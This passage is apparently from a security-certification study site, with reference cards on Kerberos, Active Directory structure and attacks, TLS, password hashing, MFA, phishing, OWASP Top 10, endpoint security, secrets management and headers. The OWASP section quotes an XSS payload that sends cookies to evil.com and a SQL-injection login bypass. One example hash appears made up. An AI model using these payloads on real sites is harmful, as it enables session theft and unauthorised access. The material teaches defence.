Authentication Service — validates identity; issues TGT (Ticket Granting Ticket)
TGS
Ticket Granting Service — issues service tickets upon valid TGT
TGT
Ticket Granting Ticket — proof of identity; valid for session
1
Client → KDC (AS)
Client sends AS-REQ with username in cleartext. No password sent yet.
2
KDC (AS) → Client
AS responds with TGT encrypted with KRBTGT (Kerberos Ticket Granting Ticket account) hash. Client decrypts AS-REP using their password-derived key. If incorrect password → cannot decrypt → fail.
3
Client → KDC (TGS)
Client presents TGT to TGS, requests service ticket for specific service (TGS-REQ).
4
KDC (TGS) → Client → Service
TGS issues service ticket encrypted with service account's hash. Client presents ticket to target service. Access granted without re-entering password.
🏢 Active Directory — Structure, Objects & Attacks SEC+ · CySA+ · PenTest+ ▶
Microsoft Directory Service
AD DS — Authentication, Authorisation & Policy at Enterprise Scale
Active Directory Domain Services (AD DS) is Microsoft's centralised identity and access management system. Nearly every enterprise Windows environment runs it. AD is the #1 target in corporate intrusions — owning AD means owning the network.
▸ STRUCTURE — LOGICAL HIERARCHY
ObjectDescriptionAnalogy
Forest Top-level security boundary. Contains one or more domains. Shares schema and global catalog. The country
Domain Core admin unit. Has its own policies, database (NTDS.dit), and DNS (Domain Name System) namespace (corp.local). The state
Organisational Unit (OU) Container inside a domain. Groups objects for delegation and GPO (Group Policy Object) application. The department
Domain Controller (DC) Server running AD DS. Authenticates users, stores NTDS (NT Directory Services).dit, replicates with other DCs. The HR office
Global Catalog (GC) Partial replica of ALL objects in the forest. Speeds up cross-domain lookups. Port 3268/3269. The central index
NTDS.dit The AD database file on each DC. Contains all objects including password hashes. Primary target. The master HR file
Trust Allows users in one domain/forest to access resources in another. Can be one- or two-way, transitive or non-transitive. Inter-company agreement
▸ AD OBJECTS — THE THREE PRINCIPALS
Object TypePurposeKey Attributes
User Account Represents a person or service. Has SID (Security Identifier), SAMAccountName, UPN (User Principal Name), password hash. memberOf, lastLogon, pwdLastSet, userAccountControl
Computer Account Every domain-joined machine. Has its own password (changed every 30 days). dNSHostName, operatingSystem, servicePrincipalName
Group Collection of principals. Controls access to resources. Domain Local · Global · Universal (scope)
Service Account (gMSA) Non-interactive account for services. Has SPN registered. Primary Kerberoasting target. servicePrincipalName, msDS-ManagedPassword
privileged groups Domain Admins · Enterprise Admins · Schema Admins · Administrators · Backup Operators · Account Operators Membership = full domain or forest control
▸ GROUP POLICY OBJECTS (GPOs)
GPOs are collections of settings pushed to computers/users in an OU. Applied order: Local → Site → Domain → OU (LSDOU). Later policies override earlier ones. Enforced GPOs cannot be overridden. Block Inheritance stops parent GPOs filtering down.
GPO Use CaseExample Setting
Password PolicyMin length 12, complexity required, 90-day expiry
Account LockoutLock after 5 bad passwords for 30 minutes
Software DeploymentPush MSI (Microsoft Installer) packages to all machines in an OU
Script ExecutionRun logon/logoff scripts; restrict PowerShell
Security SettingsDisable guest, rename Administrator, firewall rules
AppLocker / WDACWhitelist which executables are allowed to run

Get-NetGPO # enumerate GPOs
▸ COMMON AD ATTACKS
AttackWhat happensRequiresDefence
Kerberoasting Request TGS (Ticket Granting Service) for any SPN-registered account. Crack the RC4-encrypted ticket offline. Any domain user Strong passwords on service accounts; use gMSA; AES-only encryption
AS-REP Roasting Request AS-REP for accounts with "Do not require Kerberos pre-auth" set. Crack offline. Network access (no creds) Require pre-auth on all accounts; audit UAC (User Account Control) flags
Pass-the-Hash (PtH) Use stolen NTLM (NT LAN Manager) hash directly for authentication without cracking it. NTLM hash (from LSASS, SAM, NTDS) Credential Guard; disable NTLM; Protected Users group
Pass-the-Ticket (PtT) Inject stolen Kerberos TGT/TGS into current session. Impersonate user. Valid Kerberos ticket (from LSASS) Protected Users group; session monitoring
DCSync Mimic DC replication to pull all password hashes (including krbtgt) from a DC without touching disk. Domain Admin / Replication rights Monitor for DS-Replication-Get-Changes on non-DC accounts
Golden Ticket Forge a TGT (Ticket Granting Ticket) using the krbtgt hash. Valid for 10 years. Persists through password resets. krbtgt hash (from DCSync / NTDS) Reset krbtgt password TWICE; monitor for anomalous TGT lifetimes
Silver Ticket Forge a TGS for a specific service using that service account's hash. No DC contact needed. Service account hash Monitor for service tickets with no corresponding TGT
▸ AD HARDENING QUICK REFERENCE
ControlWhat it does
Tiered Admin ModelTier 0 = DC/AD · Tier 1 = Servers · Tier 2 = Workstations. Admins have separate accounts per tier.
Protected Users GroupPrevents NTLM, DES/RC4 Kerberos, credential caching, delegation for members.
Credential GuardUses Hyper-V virtualisation to isolate LSASS (Local Security Authority Subsystem Service). Blocks PtH and credential dumping.

Audit PolicyLog account logon, privilege use, DS access, and object changes. Feed into SIEM (Security Information and Event Management).
🔒 TLS (Transport Layer Security) — Handshake, Cipher Suites & Certificate Chain SEC+ · SECX ▶
Transport Layer Security
How HTTPS (HyperText Transfer Protocol Secure) Actually Works — Step by Step
TLS (formerly SSL) provides confidentiality (encryption), integrity (MAC), and authentication (certificates) over any transport. Used by HTTPS (443), SMTPS (Simple Mail Transfer Protocol Secure) (465), IMAPS (993), and most modern protocols. Current standard: TLS 1.3 (2018).
▸ TLS 1.2 HANDSHAKE (4 ROUND TRIPS)
1
ClientHello
Client → Server. Sends: TLS version, random number (client_random), list of supported cipher suites, compression methods, extensions (SNI, ALPN, supported curves).
2
ServerHello + Certificate
Server → Client. Selects cipher suite and TLS version. Sends server_random. Sends its X.509 certificate chain. Optionally sends ServerKeyExchange (for DHE/ECDHE).
3
Client Key Exchange
Client validates the certificate chain. Generates pre-master secret. If RSA (Rivest-Shamir-Adleman): encrypts with server's public key. If DHE/ECDHE: sends client DH (Diffie-Hellman) public value. Both sides derive the master secret and session keys independently.
4
Finished (both sides)
Both send a Finished message: HMAC (Hash-based Message Authentication Code) of the entire handshake transcript, encrypted with the new session keys. If both verify correctly — encrypted data transfer begins.
▸ TLS 1.3 IMPROVEMENTS (2 ROUND TRIPS → 1)
FeatureTLS 1.2TLS 1.3
Handshake RTTs (Round Trip Time)2 RTT (full) / 1 RTT (resumption)1 RTT (full) / 0 RTT (resumption — risky)
Key ExchangeRSA or DHE/ECDHEECDHE (Elliptic Curve Diffie-Hellman Ephemeral) only — RSA key exchange removed
Forward SecrecyOptional (only with DHE/ECDHE)Mandatory — every session gets unique keys
Cipher SuitesMany including weak ones (RC4, 3DES)5 strong AEAD suites only
EncryptedOnly after FinishedServer certificate encrypted during handshake
Removed—RSA key exchange, static DH, CBC (Cipher Block Chaining) mode ciphers, compression, renegotiation, SHA-1
▸ CERTIFICATE CHAIN VALIDATION
# Certificate chain: End-Entity → Intermediate CA → Root CA # # Root CA (self-signed, in OS/browser trust store) # └─ Intermediate CA (signed by Root) # └─ Server Certificate (signed by Intermediate) # # Validation steps: # 1. Build chain from server cert to trusted root # 2. Verify each signature in chain (cryptographic) # 3. Check each cert is not expired (notBefore / notAfter) # 4. Check each cert is not revoked (CRL or OCSP) # 5. Check server cert CN/SAN matches the hostname (SNI) # 6. Check cert has correct Key Usage / Extended Key Usage # Inspect a certificate from the command line openssl s_client -connect example.com:443 -showcerts openssl x509 -in cert.pem -text -noout openssl verify -CAfile chain.pem cert.pem # Check cipher suite negotiated openssl s_client -connect example.com:443 2>&1 | grep Cipher nmap --script ssl-enum-ciphers -p 443 example.com
▸ CIPHER SUITE NOTATION
# TLS 1.2 cipher suite breakdown: TLS _ ECDHE _ RSA _ WITH _ AES_256_GCM _ SHA384 │ │ │ │ │ │ │ │ │ └─ MAC / PRF algorithm │ │ │ └─ Bulk encryption (AES-256 in GCM mode = AEAD) │ │ └─ Authentication (whose certificate we verify) │ └─ Key Exchange (ECDHE = elliptic curve Diffie-Hellman ephemeral) └─ Protocol # TLS 1.3 suite (simpler — key exchange implicit ECDHE) TLS_AES_256_GCM_SHA384 # 5 suites total in 1.3 TLS_CHACHA20_POLY1305_SHA256 # for devices without hardware AES
▸ KEY CONCEPTS
ConceptMeaning
Forward Secrecy (PFS)Each session uses ephemeral keys. Compromising the private key LATER does not decrypt past sessions. Requires DHE or ECDHE.
HSTSHTTP (HyperText Transfer Protocol) Strict Transport Security. Browser header telling clients to always use HTTPS for N seconds. Defeats SSL (Secure Sockets Layer) stripping.
Certificate PinningApp hardcodes the expected cert/public key. Defeats MITM (Man-in-the-Middle) even with a trusted rogue CA (Certificate Authority). Used in mobile apps.
OCSP (Online Certificate Status Protocol) StaplingServer attaches (staples) a pre-fetched OCSP response to handshake. Faster than client fetching OCSP separately.
SNIServer Name Indication. Client sends hostname in ClientHello so server knows which cert to present. Allows virtual hosting.
CT (Cert Transparency)All public certs must be logged in public append-only logs. Lets anyone detect mis-issuance.

🧒Security Basics in Plain EnglishSec+ • Start Here▶
BIG IDEA
The CIA Triad (No Spies Involved)
Security protects three things. Confidentiality = only the right people can see it (a sealed letter). Integrity = nobody changed it secretly (a tamper seal). Availability = it's there when you need it (the door is unlocked for you). Almost every security idea protects one of these three.
ANALOGY
Authentication vs. Authorization
Authentication proves who you are (showing your ID at the door). Authorization decides what you're allowed to do once inside (your key only opens certain rooms). You authenticate first, then you're authorized.
ANALOGY
Encryption = a Locked Box
Encryption scrambles data so only someone with the key can read it. Picture putting a note in a locked box: anyone can carry the box, but only the key-holder can open it. That's why 'https' sites are safer.
HABIT
Passwords → Passphrases + MFA
Long beats complicated: 'correct-horse-battery-staple' is stronger and easier than 'P@ss1'. Multi-factor authentication (MFA) adds a second proof (a code on your phone) so a stolen password alone isn't enough.
MINDSET
Least Privilege
Give people (and programs) only the access they truly need — nothing extra. The new intern doesn't get the master key. Less access means less damage if an account is ever stolen.
STREET-SMART
Spotting Phishing
Phishing is a fake message that tricks you into clicking or typing a password. Red flags: urgency ('act now!'), odd sender addresses, surprise links, and requests for credentials. When unsure, don't click — verify through a channel you trust.
You Hear…It Really Means…
VulnerabilityA weakness (an unlocked window)
ThreatSomething that could exploit it (a burglar)
RiskThe chance it actually hurts you (likelihood × impact)
Zero TrustVerify everyone every time — assume nothing is safe by default
HardeningClosing doors you don't use to shrink the target
🧱Everyday Security HygieneSec+ • Start Here▶
DO THESE
The Habits That Stop Most Attacks
You don’t need to be an expert to be safe. A handful of boring habits blocks the vast majority of real-world attacks — the digital equivalent of washing your hands and locking your door.
BACKUPS
The 3-2-1 Rule
Keep 3 copies of anything important, on 2 different kinds of storage, with 1 copy kept offsite/offline. Then a lost laptop, a crashed drive, or ransomware becomes an annoyance instead of a disaster — if you’ve tested that the restore actually works.
PASSWORDS
Use a Manager + MFA
Humans can’t remember 100 strong, unique passwords — so don’t. A password manager remembers them for you; you remember one good master passphrase. Turn on multi-factor authentication everywhere it’s offered.
HabitWhy It Helps
Install updates promptlyPatches close known holes attackers use
Password managerUnique strong passwords without memorizing
Enable MFAA stolen password alone won’t get in
Think before you clickStops most phishing cold
Lock your screen30 seconds away ≠ open to anyone walking by
Back up (3-2-1)Turns disasters into inconveniences
🔑 Passwords & Hashing — How Logins Are Stored Safely SEC • Start Here ▶
NEVER STORE PLAINTEXT
The Golden Rule of Password Storage
Databases get breached. If passwords are stored as-is, every user's password is exposed instantly. Instead, store a hash — a one-way transformation that cannot be reversed. When a user logs in, hash what they typed and compare hashes.
WHAT IS A HASH
One-Way Fingerprint
A hash function takes any input and produces a fixed-length output. Same input ALWAYS produces same output. Even one character change completely changes the hash (avalanche effect). You cannot go from hash → original (one-way).
import hashlib text = "hunter2" h = hashlib.sha256(text.encode()).hexdigest() # f52fbd32b2b3b86ff88ef6c490628285f482af15ddcb29541f94bcf526a3f6c7 text2 = "hunter3" # one char different h2 = hashlib.sha256(text2.encode()).hexdigest() # 7a20f6f8c04b1a590a39c74b4f6b3c4a8e6a7f1c2d3e4f5a6b7c8d9e0f1a2b3 # Completely different — avalanche effect
SALTING
Why Two Users With Same Password Need Different Hashes
Without salts, two users with "password123" produce the same hash — attackers can pre-compute tables (rainbow tables) and look up hashes instantly. A salt is a random value added to the password before hashing. Every user gets a unique salt. Rainbow tables become useless.
RIGHT TOOLS FOR PASSWORDS
Use bcrypt, scrypt, or Argon2
SHA-256 is fast — that's GOOD for verifying file integrity, BAD for passwords (attackers can try billions/sec). bcrypt, scrypt, and Argon2 are deliberately slow and memory-hard. They automatically handle salting. Never hand-roll password hashing.
# pip install bcrypt import bcrypt # Hash when user registers password = "my_secure_pass" hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt()) # Verify on login entered = "my_secure_pass" if bcrypt.checkpw(entered.encode(), hashed): print("Login OK")
STRONG PASSWORDS
Length Beats Complexity
A 20-character random passphrase is stronger than "P@$$w0rd!" — and much easier to remember. Use a password manager (Bitwarden, 1Password, KeePass). Generate unique passwords for every site. Enable MFA (Multi-Factor Authentication) everywhere possible.
📲 Multi-Factor Authentication — Layers of Proof SEC • Foundation ▶
THREE FACTORS
Something You Know, Have, or Are
Knowledge factor — something you know: password, PIN, security questions (weakest).
Possession factor — something you have: phone (SMS code, authenticator app), hardware token (YubiKey), smart card.
Inherence factor — something you are: fingerprint, face, iris, voice.
MFA (Multi-Factor Authentication) requires 2 or more different factor types. Two passwords is NOT MFA.
MFA METHODS RANKED
From Weakest to Strongest
MethodPhish-resistant?Notes
SMS / email OTP (One-Time Password)NoVulnerable to SIM (Subscriber Identity Module) swap, SS7 attacks; better than nothing
TOTP app (Google Auth, Authy)PartialTime-based 6-digit codes; can be phished in real-time
Push notificationNoMFA fatigue attacks — user approves out of habit
Hardware token (FIDO2/WebAuthn)YesCryptographically bound to domain; gold standard
PasskeysYesFIDO2 (Fast Identity Online 2) using device biometrics; replacing passwords
HOW TOTP WORKS
Time-Based One-Time Passwords
During setup, the server shares a secret key with your phone (usually via QR code). Every 30 seconds, both your phone AND the server compute HMAC-SHA1(secret + current_time_window). They should match. An attacker needs the secret AND the current window — that's why TOTP codes expire so fast.
🎣 Phishing — Anatomy of a Social Engineering Attack SEC • Threat Awareness ▶
WHAT IS PHISHING
Deception, Not Hacking
Phishing attacks trick people into giving up credentials, installing malware, or sending money. They exploit psychology, not software vulnerabilities. No patch exists for human instinct. The name comes from "fishing" — casting bait and waiting for a bite.
ATTACK VARIETIES
Phishing, Spear, Whaling, Vishing, Smishing
Phishing — mass emails, generic "Dear Customer" bait.
Spear phishing — targeted at a specific person using research (LinkedIn, social media). High success rate.
Whaling — targets C-suite executives. Higher payoff.
Vishing — voice phishing by phone. "This is Microsoft Support…"
Smishing — SMS phishing. "Your package is stuck, click here."
Business Email Compromise (BEC) — impersonates a CEO to trick finance into a wire transfer.
RED FLAGS
How to Spot a Phishing Attempt
• Urgency or fear: "Your account will be suspended in 24 hours!"
• Mismatched URLs (Uniform Resource Locator): display text says google.com, actual link is g00gle.evil.com
• Unexpected attachment — especially .exe, .docm, .zip files
• Slightly wrong sender address: support@amaz0n.com vs amazon.com
• Grammar errors (though AI-generated phishing now has perfect grammar)
• Requests for credentials, wire transfers, or gift cards via email
• Too-good-to-be-true offers
DEFENSE
What Actually Stops Phishing
Technical: email filtering (spam/malware), DMARC/SPF/DKIM to prevent spoofing, URL rewriting, MFA (Multi-Factor Authentication) (even if credentials are stolen, attacker can't log in).
Human: regular security awareness training with simulated phishing campaigns. People need to fail safely in training, not in real attacks.
Process: out-of-band verification (call the CEO on a known number before wiring $500k).
🔒 TLS (Transport Layer Security) & HTTPS (HyperText Transfer Protocol Secure) — How Secure Connections Work SEC • Foundation ▶
THE PROBLEM
HTTP (HyperText Transfer Protocol) Is Plaintext — Anyone Can Read It
When you send a form over HTTP, the data travels through multiple hops (your router, ISP, CDN, etc.) as readable text. Anyone on those hops can see your password, credit card, messages. TLS (Transport Layer Security) encrypts the connection so even if someone intercepts the traffic, all they see is gibberish.
TLS HANDSHAKE
Establish Trust + Exchange Keys
1. Client → Server: "Hello. I support these cipher suites and TLS versions."
2. Server → Client: "Hello. Here's my certificate. We'll use cipher X."
3. Client: Verify certificate against trusted CA (Certificate Authority) list.
4. Key exchange (ECDHE): Both sides derive the same symmetric session key without ever transmitting it (Diffie-Hellman magic).
5. All further communication encrypted with that session key.
The asymmetric crypto (certificates) is only used during handshake. The bulk encryption uses faster symmetric crypto.
CERTIFICATES
Digital Identity Documents
A TLS certificate binds a domain name to a public key, signed by a Certificate Authority (CA) the browser trusts. The chain of trust:
Root CA → (built into OS/browser)
Intermediate CA → (issued by root)
End-entity cert → (your server's cert)
If you trust the root, and the root signed the intermediate, and the intermediate signed your cert, you trust your cert.
CERT VALIDATION LEVELS
DV vs OV vs EV
Domain Validated (DV) — CA just verifies you control the domain. Free (Let's Encrypt). Shows padlock in browser. Good for most sites.
Organization Validated (OV) — CA verifies organization identity. More trust signal for businesses.
Extended Validation (EV) — rigorous identity check. Historically showed green bar with company name (most browsers dropped this UI).
COMMON CERT ISSUES
Errors You'll See and What They Mean
ErrorCauseFix
Certificate expiredcert past validity dateRenew/replace cert (Let's Encrypt auto-renews)
Name mismatchcert for example.com used on sub.example.comUse wildcard cert or include SANs (Subject Alternative Name)
Untrusted CAself-signed or private CAInstall CA cert in trust store or buy a public cert
Incomplete chainmissing intermediate certInclude full chain in server config
LET'S ENCRYPT
Free, Automated, Trusted Certificates
Let's Encrypt is a free, automated CA. Use the certbot tool to get and auto-renew certificates with zero cost. It changed the web — HTTPS adoption went from ~40% in 2015 to ~95%+ today, largely because Let's Encrypt eliminated the cost barrier.
# Install certbot (Debian/Ubuntu) sudo apt install certbot python3-certbot-nginx # Get cert and auto-configure nginx sudo certbot --nginx -d example.com -d www.example.com # Test auto-renewal sudo certbot renew --dry-run
🔐 Encryption Fundamentals — Symmetric vs Asymmetric SEC • Foundation ▶
SYMMETRIC ENCRYPTION
Same Key to Lock and Unlock
One key encrypts AND decrypts. Fast, efficient for large data. Problem: key distribution — how do you securely share the key with the other party? Best algorithms: AES-256 (gold standard), ChaCha20. Used for: encrypting data at rest, bulk data transfer after handshake.
ASYMMETRIC ENCRYPTION
Public Key + Private Key
Two mathematically linked keys. Public key encrypts (share freely — give to everyone). Private key decrypts (keep secret). Solves key distribution: encrypt with their public key → only they can decrypt with their private key. Slower than symmetric. Best algorithms: RSA-2048+, ECC (Elliptic Curve Cryptography) (smaller keys, same strength). Used for: TLS (Transport Layer Security) handshake, SSH (Secure Shell) auth, digital signatures.
PropertySymmetricAsymmetric
Keys1 shared keyKey pair (public + private)
SpeedVery fastSlow (100-1000× slower)
Key distributionHard (secure channel needed)Easy (public key is public)
Best forBulk data encryptionKey exchange, signatures
ExampleAES-256RSA (Rivest-Shamir-Adleman), ECC
Used in TLSSession data (after handshake)Handshake / key exchange
DIGITAL SIGNATURES
Prove It Came From You and Wasn't Changed
Signing: hash the document, encrypt the hash with your PRIVATE key → signature.
Verifying: decrypt signature with sender's PUBLIC key → get hash. Hash the document yourself. If hashes match → not tampered, signed by private key holder.
Used in: software distribution (code signing), email (S/MIME, PGP), TLS certificates, git commits, JWT (JSON Web Token) tokens.
🪪 Identity & Access Management — Who Can Do What SEC • Foundation ▶
THE CORE PROBLEM
Authentication vs Authorization
Authentication (AuthN) — proving who you are. "I am Alice." Verified by password, biometric, token, or certificate.
Authorization (AuthZ) — what you're allowed to do. "Alice can read reports but not delete records." Enforced by permissions, roles, policies.
These are separate concerns. Getting them confused causes security holes (assuming that anyone logged in can do anything).
PRINCIPLE OF LEAST PRIVILEGE
Give Only What's Needed
Every user, service, and process should have the minimum permissions needed to do its job — and nothing more. An analytics service that reads data shouldn't have write permissions. A developer account shouldn't have production database access by default. When something is compromised, least privilege contains the blast radius.
RBAC vs ABAC
Role-Based vs Attribute-Based Access Control
RBAC (Role-Based) — assign roles to users; permissions attached to roles. Simple to manage at scale. "Alice is an Admin; Admins can do X, Y, Z." Standard in most systems.
ABAC (Attribute-Based) — permissions based on attributes of user, resource, environment. "Allow if user.department = finance AND resource.sensitivity = confidential AND time = business_hours." More flexible, harder to audit.
SSO & FEDERATION
One Login, Many Systems
SSO (Single Sign-On) — log in once, access many applications. Used with SAML (Security Assertion Markup Language) 2.0 or OIDC (OpenID Connect) (OAuth 2.0 extension). Benefits: one password to manage, one place to revoke access when someone leaves.
OIDC/OAuth 2.0 — modern standard for federated identity. "Login with Google" is OIDC. Google proves your identity to the app without giving the app your password.
SAML 2.0 — XML-based, enterprise standard. Used for enterprise SSO (Okta, Azure AD, Ping).
ZERO TRUST
Never Trust, Always Verify
Traditional security assumed: inside the network = trusted; outside = untrusted. Zero trust assumes breach and verifies every request regardless of source — even from inside the corporate network.
Principles:
• Verify explicitly — authenticate and authorize every request, every time
• Least privilege — minimal access, time-limited
• Assume breach — design as if attackers are already inside
⛓️ Supply Chain Security — Trust What You Build With SEC • Advanced Awareness ▶
WHAT IS SUPPLY CHAIN SECURITY
Attackers Go for the Builder, Not the Building
Modern apps depend on thousands of open-source packages. Attackers compromise upstream — a popular library, build tool, or CI/CD (Continuous Integration / Continuous Delivery) pipeline — and then automatically infect everything downstream that uses it. The SolarWinds breach (2020) infected 18,000 organizations via a compromised software update. The XZ Utils backdoor (2024) nearly compromised SSH (Secure Shell) servers worldwide.
SBOM
Software Bill of Materials
An SBOM is an inventory of every component in your software — all dependencies, their versions, and their licenses. Like an ingredients list for your app. When a critical vulnerability (Log4Shell, Heartbleed) drops, you can instantly check if you're affected by scanning your SBOM. Now required for software sold to US federal agencies.
DEPENDENCY HYGIENE
Practical Steps to Reduce Risk
• Pin versions: use requests==2.31.0 not requests>=2. Unpinned deps silently update and break.
• Verify hashes: pip install --require-hashes validates that downloaded packages match expected hashes.
• Use Dependabot or Renovate: automated PRs when dependencies have security updates.
• Audit regularly: pip audit, npm audit, cargo audit scan for known vulnerabilities.
• Don't install unknown packages: "typosquatting" packages (requestts, colors2) exist to compromise you.
🕸️ OWASP (Open Worldwide Application Security Project) Top 10 — The Most Critical Web Security Risks SEC • Essential ▶
WHAT IS OWASP
Open Web Application Security Project
OWASP is a nonprofit foundation that publishes the Top 10 — a consensus list of the most critical web application security risks, updated every few years based on real-world data. Every web developer and security professional should know these by heart.
#RiskExample AttackPrevention
A01Broken Access ControlChanging URL (Uniform Resource Locator) param to access another user's dataEnforce authorization server-side for every request
A02Cryptographic FailuresHTTP (HyperText Transfer Protocol) instead of HTTPS (HyperText Transfer Protocol Secure); MD5 (Message Digest 5) password hashesTLS (Transport Layer Security) everywhere; bcrypt for passwords; AES-256 for data
A03Injection (SQLi, XSS, etc.)' OR '1'='1 in login fieldParameterized queries; input validation; output encoding
A04Insecure DesignNo rate limiting; predictable reset tokensThreat modeling; security requirements from day 1
A05Security MisconfigurationDefault creds; debug mode in prod; open S3 (Simple Storage Service) bucketsHardening guides; IaC (Infrastructure as Code) with security checks; scan configs
A06Vulnerable ComponentsLog4Shell; Heartbleed; npm package with malwareInventory dependencies; Dependabot; SCA (Software Composition Analysis) scanning
A07Auth FailuresBrute force; credential stuffing; weak passwordsMFA (Multi-Factor Authentication); account lockout; breached password checks
A08Software Integrity FailuresCI/CD (Continuous Integration / Continuous Delivery) pipeline compromise; insecure deserializationCode signing; trusted registries; verify checksums
A09Logging & Monitoring FailuresAttack goes undetected for monthsCentralized logging; SIEM (Security Information and Event Management) alerts; test detection
A10SSRF (Server-Side Request Forgery)User-supplied URL fetched by server → internal services exposedAllowlist URLs; block RFC-1918 addresses
SQL (Structured Query Language) INJECTION DEEP DIVE
The Most Classic Vulnerability
SQL injection lets an attacker insert SQL commands into a query. If a login form does:
# VULNERABLE — NEVER DO THIS query = f"SELECT * FROM users WHERE name='{username}' AND password='{password}'" # If username = "' OR '1'='1'; -- " # Query becomes: SELECT * FROM users WHERE name='' OR '1'='1'; --' # The -- comments out rest; '1'='1' is always true → login without password! # CORRECT — Parameterized query (Python sqlite3) cursor.execute("SELECT * FROM users WHERE name=? AND password=?", (username, password_hash)) # Parameters are treated as DATA, never as SQL code
XSS
Cross-Site Scripting — Injecting JavaScript
XSS lets attackers inject malicious JavaScript into web pages that other users see. If you display unsanitized user input in HTML (HyperText Markup Language), an attacker submits <script>document.location='https://evil.com?c='+document.cookie</script> and steals every visitor's session cookie.
Prevention: always HTML-encode output. In Python Jinja2: {{ user_input }} auto-escapes. Never use {{ user_input|safe }} unless you're absolutely sure it's clean. Use Content Security Policy (CSP) headers.
💻 Endpoint Security — Protecting the Devices People Actually Use SEC • Essential ▶
WHY ENDPOINTS MATTER
The Endpoint Is the New Perimeter
The old security model was a hard perimeter (firewall) around a soft inside. But with remote work, cloud, and mobile, there is no perimeter — laptops connect from coffee shops, phones access company email. The endpoint (any device: laptop, phone, server, IoT) is now where attacks land. Most breaches start with a compromised endpoint: a clicked phishing link, a malicious download, a stolen laptop.
AV → EDR (Endpoint Detection and Response) → XDR (Extended Detection and Response)
The Evolution of Endpoint Protection
GenerationFull NameHow It WorksLimitation
AVAntivirusSignature-based — matches known malware fingerprintsCan't catch new/unknown (zero-day) malware
NGAVNext-Gen AntivirusAdds behavioral analysis, ML (Machine Learning), heuristicsStill focused on prevention, limited investigation
EDREndpoint Detection & ResponseRecords endpoint activity, detects suspicious behavior, enables investigation + responseEndpoint-only visibility
XDRExtended Detection & ResponseCorrelates across endpoint, network, email, cloud, identityComplexity, cost, vendor lock-in
MDRManaged Detection & ResponseEDR/XDR + a human SOC (Security Operations Center) team running it for youOutsourced — less direct control
EDR CAPABILITIES
What EDR Actually Does
CapabilityWhat It Means
Continuous recordingLogs process launches, file changes, network connections, registry edits — like a flight recorder
Behavioral detectionFlags suspicious sequences (Word spawns PowerShell spawns cmd = likely malicious)
Threat huntingLets analysts query historical data: "show every host that ran certutil last week"
IsolationRemotely quarantine a compromised host from the network (but keep EDR connection)
RemediationKill processes, delete files, roll back changes remotely
Root cause analysisReconstruct the full attack chain from initial access to impact
ENDPOINT HARDENING
Reduce the Attack Surface Before Anything Lands
ControlWhy It Helps
Disk encryption (BitLocker/FileVault/LUKS)Stolen laptop = no data exposure
Application allowlistingOnly approved apps run — blocks unknown malware
Least privilege (no local admin)Malware can't install system-wide if user isn't admin
Patch managementCloses known vulnerabilities attackers exploit
Host firewallBlocks unexpected inbound/outbound connections
Disable macros / restrict OfficeMacros are a top malware delivery vector
USB (Universal Serial Bus) controlBlocks malicious USB drops and data exfiltration
DLP
Data Loss Prevention — Stopping Data From Walking Out
DLP tools detect and prevent sensitive data (PII, credit cards, source code, classified docs) from leaving the organization — whether by accident (employee emails a spreadsheet to wrong address) or malice (insider exfiltrating data). DLP works by inspecting content against patterns and policies at three points:
DLP TypeWhere It WatchesExample Block
Data in motionNetwork traffic, email, web uploadsBlocks email containing SSNs to external address
Data at restFiles on disks, databases, cloud storageFinds unencrypted credit card numbers in a file share
Data in useEndpoint actions (copy, print, USB)Blocks copying customer DB to a USB drive
🗝️ Secrets Management — Stop Hardcoding Passwords SEC • Essential ▶
THE PROBLEM
Secrets End Up Everywhere They Shouldn't
Passwords, API (Application Programming Interface) keys, database credentials, TLS (Transport Layer Security) private keys, tokens — collectively "secrets." The cardinal sin is hardcoding them in source code, where they get committed to Git, copied around, and leaked. GitHub is constantly scanned by attackers for accidentally committed AWS (Amazon Web Services) keys (they're exploited within minutes). Secrets management is the discipline of storing, accessing, rotating, and auditing secrets safely.
Anti-PatternDo This Instead
Hardcoded in source: api_key = "sk-abc123"Environment variable or secrets manager
Committed config file with passwords.gitignore it; use a template + secrets store
Secrets in Slack/email/wikiA proper vault with access controls
Same password reused everywhereUnique secrets, rotated regularly
Shared admin credentialsIndividual accounts + just-in-time access
SECRETS MANAGERS
Purpose-Built Tools for Secrets
ToolNotes
HashiCorp VaultThe gold standard; dynamic secrets, leasing, broad integrations
AWS Secrets Manager / Parameter StoreNative to AWS; auto-rotation
Azure Key Vault / GCP (Google Cloud Platform) Secret ManagerCloud-native equivalents
1Password / Bitwarden (Secrets)Team-friendly, good for smaller orgs
Sealed Secrets / SOPSEncrypt secrets so they CAN live in Git safely
KEY MANAGEMENT
The Lifecycle of Cryptographic Keys
Encryption is only as strong as your key management. A perfectly encrypted database is worthless if the key sits in plaintext next to it. Keys have a lifecycle that must be managed.
PhaseWhat It Involves
GenerationCreate keys with strong randomness, sufficient length
StorageProtect keys: HSM (Hardware Security Module) or KMS (Key Management Service), never plaintext
DistributionGet keys to where they're needed securely
RotationReplace keys periodically — limits damage if one leaks
RevocationInvalidate compromised keys immediately
DestructionSecurely delete retired keys
A KMS (Key Management Service) handles this lifecycle. Envelope encryption is the common pattern: a data key encrypts your data, and a master key (in the KMS/HSM) encrypts the data key — so the master key never leaves the secure boundary.
SECRET SCANNING
Catch Leaks Before They Ship
# Scan a repo for committed secrets gitleaks detect --source . # popular open-source scanner trufflehog git file://. # also scans git history # If you DID commit a secret: # 1. ROTATE it immediately (assume it's compromised) # 2. Remove from history (git filter-repo / BFG) # 3. Add pre-commit hook to prevent recurrence # Prevent future leaks with a pre-commit hook # (gitleaks has a pre-commit integration)
🛡️ Web Security Headers — Free Defense in a Few Lines SEC • Practical ▶
THE IDEA
HTTP (HyperText Transfer Protocol) Headers That Harden the Browser
Web servers can send special HTTP response headers that instruct the browser to enforce security protections. They're cheap to add and prevent entire classes of attacks (XSS, clickjacking, protocol downgrade). Auditing these is often one of the first things a security review checks.
HeaderProtects AgainstExample
Content-Security-PolicyXSS (Cross-Site Scripting), data injectiondefault-src 'self'
Strict-Transport-Security (HSTS)Protocol downgrade, SSL (Secure Sockets Layer) strippingmax-age=31536000; includeSubDomains
X-Frame-OptionsClickjackingDENY (don't allow framing)
X-Content-Type-OptionsMIME (Multipurpose Internet Mail Extensions) sniffing attacksnosniff
Referrer-PolicyLeaking URLs (Uniform Resource Locator) to other sitesstrict-origin-when-cross-origin
Permissions-PolicyAbuse of browser features (camera, mic)geolocation=(), camera=()
COOKIE SECURITY
The Flags That Protect Sessions
Session cookies are prime theft targets — steal one and you can impersonate the user. Three flags dramatically reduce the risk.
FlagEffect
